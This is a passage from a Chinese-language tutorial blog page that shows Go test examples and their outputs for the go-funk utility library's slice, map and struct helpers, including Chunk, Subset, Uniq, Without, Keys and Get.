(0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-12-遍历切片"><a href="#3-12-遍历切片" class="headerlink" title="3.12 遍历切片"></a>3.12 遍历切片</h3><ul><li><code>ForEach</code>: 从左边遍历切片。</li><li><code>ForEachRight</code>: 从右边遍历切片。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 遍历切片</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestForeachSlice</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 从左边遍历</span><br><span class="hljs-keyword">var</span> leftRes []<span class="hljs-type">int</span><br>funk.ForEach([]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(x <span class="hljs-type">int</span>)</span></span> &#123;<br>leftRes = <span class="hljs-built_in">append</span>(leftRes, x*<span class="hljs-number">2</span>)<br>&#125;)<br>fmt.Println(<span class="hljs-string">&quot;ForEach:&quot;</span>, leftRes)<br><span class="hljs-comment">// 从右边遍历</span><br><span class="hljs-keyword">var</span> rightRes []<span class="hljs-type">int</span><br>funk.ForEachRight([]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(x <span class="hljs-type">int</span>)</span></span> &#123;<br>rightRes = <span class="hljs-built_in">append</span>(rightRes, x*<span class="hljs-number">2</span>)<br>&#125;)<br>fmt.Println(<span class="hljs-string">&quot;ForEachRight:&quot;</span>, rightRes)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestForeachSlice</span><br><span class="hljs-comment">ForEach: [2 4 6 8]</span><br><span class="hljs-comment">ForEachRight: [8 6 4 2]</span><br><span class="hljs-comment">--- PASS: TestForeachSlice (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-13-删除首或尾"><a href="#3-13-删除首或尾" class="headerlink" title="3.13 删除首或尾"></a>3.13 删除首或尾</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 除去第一个 或者 最后一个</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestDelLastOrFirst</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>a := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>&#125;<br><span class="hljs-comment">// 除去第一个，返回剩余元素</span><br>fmt.Println(funk.Tail(a))<br><span class="hljs-comment">// 除去最后一个，返回剩余元素</span><br>fmt.Println(funk.Initial(a))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestDelLastOrFirst</span><br><span class="hljs-comment">[2 3 4 5 6 7]</span><br><span class="hljs-comment">[1 2 3 4 5 6]</span><br><span class="hljs-comment">--- PASS: TestDelLastOrFirst (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-14-判断A切片是否属于B切片子集"><a href="#3-14-判断A切片是否属于B切片子集" class="headerlink" title="3.14 判断A切片是否属于B切片子集"></a>3.14 判断A切片是否属于B切片子集</h3><blockquote><p><code>Subset(x interface&#123;&#125;, y interface&#123;&#125;) bool</code>: 判断<code>x</code>是否属于<code>y</code>的切片。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 判断是否属于子集</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestSubset</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 判断基础切片</span><br>fmt.Println(<span class="hljs-string">&quot;是否属于子集:&quot;</span>, funk.Subset([]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>&#125;, []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;))<br><span class="hljs-comment">// 判断自定义结构体切片</span><br>subStu1 := []Student&#123;&#123;Name: <span class="hljs-string">&quot;张三&quot;</span>, Age: <span class="hljs-number">18</span>&#125;&#125;<br>subStu2 := []Student&#123;&#123;Name: <span class="hljs-string">&quot;张三&quot;</span>, Age: <span class="hljs-number">22</span>&#125;&#125;<br>allStu := []Student&#123;<br>&#123;Name: <span class="hljs-string">&quot;张三&quot;</span>, Age: <span class="hljs-number">18</span>&#125;,<br>&#123;Name: <span class="hljs-string">&quot;李四&quot;</span>, Age: <span class="hljs-number">22</span>&#125;,<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;subStu1: &quot;</span>, funk.Subset(subStu1, allStu))<br>fmt.Println(<span class="hljs-string">&quot;subStu2: &quot;</span>, funk.Subset(subStu2, allStu))<br><span class="hljs-comment">// 判断空切片是否属于另一切片子集</span><br>fmt.Println(<span class="hljs-string">&quot;判断空集：&quot;</span>, funk.Subset([]<span class="hljs-type">int</span>&#123;&#125;, []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestSubset</span><br><span class="hljs-comment">是否属于子集: true</span><br><span class="hljs-comment">subStu1:  true</span><br><span class="hljs-comment">subStu2:  false</span><br><span class="hljs-comment">判断空集： true</span><br><span class="hljs-comment">--- PASS: TestSubset (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-15-分组"><a href="#3-15-分组" class="headerlink" title="3.15 分组"></a>3.15 分组</h3><h3 id="3-15-分组-1"><a href="#3-15-分组-1" class="headerlink" title="3.15 分组"></a>3.15 分组</h3><blockquote><p><code>Chunk(arr interface&#123;&#125;, size int) interface&#123;&#125;</code>: 把<code>arr</code>按照<code>每组size个</code>进行分组</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 分组</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestChunk</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>a := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>&#125;<br><span class="hljs-comment">// 分组(每组2个)</span><br>fmt.Println(funk.Chunk(a, <span class="hljs-number">2</span>))<br><span class="hljs-comment">// 分组自定义结构体切片 (每组2个)</span><br>stuList := []Student&#123;<br>&#123;Name: <span class="hljs-string">&quot;张三&quot;</span>, Age: <span class="hljs-number">18</span>&#125;,<br>&#123;Name: <span class="hljs-string">&quot;小明&quot;</span>, Age: <span class="hljs-number">20</span>&#125;,<br>&#123;Name: <span class="hljs-string">&quot;李四&quot;</span>, Age: <span class="hljs-number">22</span>&#125;,<br>&#123;Name: <span class="hljs-string">&quot;赵武&quot;</span>, Age: <span class="hljs-number">32</span>&#125;,<br>&#123;Name: <span class="hljs-string">&quot;小英&quot;</span>, Age: <span class="hljs-number">19</span>&#125;,<br>&#125;<br>fmt.Println(funk.Chunk(stuList, <span class="hljs-number">2</span>))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestChunk</span><br><span class="hljs-comment">[[1 2] [3 4] [5 6] [7]]</span><br><span class="hljs-comment">[[&#123;张三 18&#125; &#123;小明 20&#125;] [&#123;李四 22&#125; &#123;赵武 32&#125;] [&#123;小英 19&#125;]]</span><br><span class="hljs-comment">--- PASS: TestChunk (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-16-把结构体切片转成map"><a href="#3-16-把结构体切片转成map" class="headerlink" title="3.16 把结构体切片转成map"></a>3.16 把结构体切片转成map</h3><blockquote><p><code>ToMap(in interface&#123;&#125;, pivot string) interface&#123;&#125;</code>: 把切片<code>in</code>,转成以<code>pivot</code>为<code>key</code>的<code>map</code>。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 结构体转成Map</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestToMap</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>bookList := []Book&#123;<br>&#123;Id: <span class="hljs-number">1</span>, Name: <span class="hljs-string">&quot;西游记&quot;</span>&#125;,<br>&#123;Id: <span class="hljs-number">2</span>, Name: <span class="hljs-string">&quot;水浒传&quot;</span>&#125;,<br>&#123;Id: <span class="hljs-number">3</span>, Name: <span class="hljs-string">&quot;三国演义&quot;</span>&#125;,<br>&#125;<br><span class="hljs-comment">// 转成以Id为Key的Map</span><br>fmt.Println(<span class="hljs-string">&quot;结果:&quot;</span>, funk.ToMap(bookList, <span class="hljs-string">&quot;Id&quot;</span>))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestToMap</span><br><span class="hljs-comment">结果: map[1:&#123;1 西游记&#125; 2:&#123;2 水浒传&#125; 3:&#123;3 三国演义&#125;]</span><br><span class="hljs-comment">--- PASS: TestToMap (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-17-把切片值转成Map中的Key"><a href="#3-17-把切片值转成Map中的Key" class="headerlink" title="3.17 把切片值转成Map中的Key"></a>3.17 把切片值转成<code>Map</code>中的<code>Key</code></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestMap</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 将切片最为map的key</span><br>r := funk.Map([]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(x <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">string</span>) &#123;<br><span class="hljs-keyword">return</span> x, <span class="hljs-string">&quot;go&quot;</span><br>&#125;)<br>fmt.Println(<span class="hljs-string">&quot;r=&quot;</span>, r)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestMap</span><br><span class="hljs-comment">r= map[1:go 2:go 3:go 4:go]</span><br><span class="hljs-comment">--- PASS: TestMap (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-18-把二维切片转成一维切片"><a href="#3-18-把二维切片转成一维切片" class="headerlink" title="3.18 把二维切片转成一维切片"></a>3.18 把二维切片转成一维切片</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 把二维切片转成一维切片</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestFlatMap</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>   r := funk.FlatMap([][]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">4</span>&#125;&#125;, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(x []<span class="hljs-type">int</span>)</span></span> []<span class="hljs-type">int</span> &#123;<br>      <span class="hljs-keyword">return</span> x<br>   &#125;)<br>   fmt.Printf(<span class="hljs-string">&quot;%#v\n&quot;</span>, r)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestFlatMap</span><br><span class="hljs-comment">[]int&#123;1, 2, 3, 4&#125;</span><br><span class="hljs-comment">--- PASS: TestFlatMap (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-19-打乱切片"><a href="#3-19-打乱切片" class="headerlink" title="3.19 打乱切片"></a>3.19 打乱切片</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestShuffle</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>a := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>&#125;<br><span class="hljs-comment">// 打乱多次</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">3</span>; i++ &#123;<br>fmt.Println(fmt.Sprintf(<span class="hljs-string">&quot;第%v次打乱a&quot;</span>, i), funk.Shuffle(a))<br>&#125;<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestShuffle</span><br><span class="hljs-comment">第1次打乱a [5 4 2 6 7 0 3 1]</span><br><span class="hljs-comment">第2次打乱a [1 6 7 3 2 5 0 4]</span><br><span class="hljs-comment">第3次打乱a [5 1 7 6 0 4 2 3]</span><br><span class="hljs-comment">--- PASS: TestShuffle (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-20-反转切片"><a href="#3-20-反转切片" class="headerlink" title="3.20 反转切片"></a>3.20 反转切片</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 反转切片</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestReverse</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;ReverseInt:&quot;</span>, funk.ReverseInt([]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;))<br>fmt.Println(<span class="hljs-string">&quot;Reverse,任意类型:&quot;</span>, funk.Reverse([]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;<span class="hljs-number">1</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">3.02</span>, <span class="hljs-number">4</span>, <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-number">6</span>&#125;))<br>fmt.Println(<span class="hljs-string">&quot;Reverse,Str:&quot;</span>, funk.ReverseStrings([]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>&#125;))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestReverse</span><br><span class="hljs-comment">ReverseInt: [6 5 4 3 2 1]</span><br><span class="hljs-comment">Reverse,任意类型: [6 5 4 3.02 2 1]</span><br><span class="hljs-comment">Reverse,Str: [d c b a]</span><br><span class="hljs-comment">--- PASS: TestReverse (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-21-元素去重"><a href="#3-21-元素去重" class="headerlink" title="3.21 元素去重"></a>3.21 元素去重</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 去重</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestUniq</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>a := []<span class="hljs-type">int64</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment">// 过滤整型类型</span><br>fmt.Println(<span class="hljs-string">&quot;Uniq:&quot;</span>, funk.Uniq(a))<br>fmt.Println(<span class="hljs-string">&quot;UniqInt64:&quot;</span>, funk.UniqInt64(a))<br>b := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;go&quot;</span>&#125;<br><span class="hljs-comment">// 过滤字符串类型</span><br>fmt.Println(<span class="hljs-string">&quot;UniqString:&quot;</span>, funk.UniqString(b))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestUniq</span><br><span class="hljs-comment">Uniq: [1 2 3 4]</span><br><span class="hljs-comment">UniqInt64: [1 2 3 4]</span><br><span class="hljs-comment">UniqString: [php go c]</span><br><span class="hljs-comment">--- PASS: TestUniq (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="3-22-删除制定元素"><a href="#3-22-删除制定元素" class="headerlink" title="3.22 删除制定元素"></a>3.22 删除制定元素</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 删除制定元素</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestWithOut</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 删除具体元素</span><br>b := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>&#125;<br>without := funk.Without(b, <span class="hljs-number">30</span>)<br>fmt.Println(<span class="hljs-string">&quot;删除30:&quot;</span>, without)<br><span class="hljs-comment">// 删除自定义结构体元素</span><br>stuList := []Student&#123;<br>&#123;Name: <span class="hljs-string">&quot;张三&quot;</span>, Age: <span class="hljs-number">18</span>&#125;,<br>&#123;Name: <span class="hljs-string">&quot;李四&quot;</span>, Age: <span class="hljs-number">22</span>&#125;,<br>&#123;Name: <span class="hljs-string">&quot;范五&quot;</span>, Age: <span class="hljs-number">24</span>&#125;,<br>&#125;<br>res := funk.Without(stuList, Student&#123;Name: <span class="hljs-string">&quot;李四&quot;</span>, Age: <span class="hljs-number">22</span>&#125;)<br>fmt.Println(<span class="hljs-string">&quot;删除李四:&quot;</span>, res)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestWithOut</span><br><span class="hljs-comment">删除30: [10 20 40]</span><br><span class="hljs-comment">删除李四: [&#123;张三 18&#125; &#123;范五 24&#125;]</span><br><span class="hljs-comment">--- PASS: TestWithOut (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="4-映射-map-操作"><a href="#4-映射-map-操作" class="headerlink" title="4. 映射(map)操作"></a>4. 映射(<code>map</code>)操作</h2><h3 id="4-1-获取所有的Key"><a href="#4-1-获取所有的Key" class="headerlink" title="4.1 获取所有的Key"></a>4.1 获取所有的<code>Key</code></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 获取map中所有的key</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestMapKeys</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>res := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;张三&quot;</span>: <span class="hljs-number">18</span>,<br><span class="hljs-string">&quot;李四&quot;</span>: <span class="hljs-number">20</span>,<br><span class="hljs-string">&quot;赵武&quot;</span>: <span class="hljs-number">25</span>,<br>&#125;<br>keys := funk.Keys(res)<br>fmt.Printf(<span class="hljs-string">&quot;keys: %#v %T \n&quot;</span>, keys, keys)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestMapKeys</span><br><span class="hljs-comment">keys: []string&#123;&quot;张三&quot;, &quot;李四&quot;, &quot;赵武&quot;&#125; []string </span><br><span class="hljs-comment">--- PASS: TestMapKeys (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="4-2-获取所有的Value"><a href="#4-2-获取所有的Value" class="headerlink" title="4.2 获取所有的Value"></a>4.2 获取所有的<code>Value</code></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 获取map中的所有values</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestMapValues</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>res := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;张三&quot;</span>: <span class="hljs-number">18</span>,<br><span class="hljs-string">&quot;李四&quot;</span>: <span class="hljs-number">20</span>,<br><span class="hljs-string">&quot;赵武&quot;</span>: <span class="hljs-number">25</span>,<br>&#125;<br>values := funk.Values(res)<br>fmt.Printf(<span class="hljs-string">&quot;values: %#v %T \n&quot;</span>, values, values)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestMapValues</span><br><span class="hljs-comment">values: []int&#123;18, 20, 25&#125; []int </span><br><span class="hljs-comment">--- PASS: TestMapValues (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="5-结构体-struct-切片操作"><a href="#5-结构体-struct-切片操作" class="headerlink" title="5. 结构体(struct)切片操作"></a>5. 结构体(<code>struct</code>)切片操作</h2><h3 id="5-1-取结构体某元素为切片"><a href="#5-1-取结构体某元素为切片" class="headerlink" title="5.1 取结构体某元素为切片"></a>5.1 取结构体某元素为切片</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestGetToSlice</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>userList := []User&#123;<br>&#123;<br>Name: <span class="hljs-string">&quot;张三&quot;</span>,<br>Home: <span class="hljs-keyword">struct</span> &#123;<br>City <span class="hljs-type">string</span><br>&#125;&#123;<span class="hljs-string">&quot;北京&quot;</span>&#125;,<br>&#125;,<br>&#123;<br>Name: <span class="hljs-string">&quot;小明&quot;</span>,<br>Home: <span class="hljs-keyword">struct</span> &#123;<br>City <span class="hljs-type">string</span><br>&#125;&#123;<span class="hljs-string">&quot;南京&quot;</span>&#125;,<br>&#125;,<br>&#125;<br><span class="hljs-comment">// 取一层</span><br>names := funk.Get(userList, <span class="hljs-string">&quot;Name&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;names:&quot;</span>, names)<br><span class="hljs-comment">// 取其他层</span><br>homes := funk.Get(userList, <span class="hljs-string">&quot;Home.City&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;homes:&quot;</span>, homes)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestGetToSlice</span><br><span class="hljs-comment">names: [张三 小明]</span><br><span class="hljs-comment">homes: 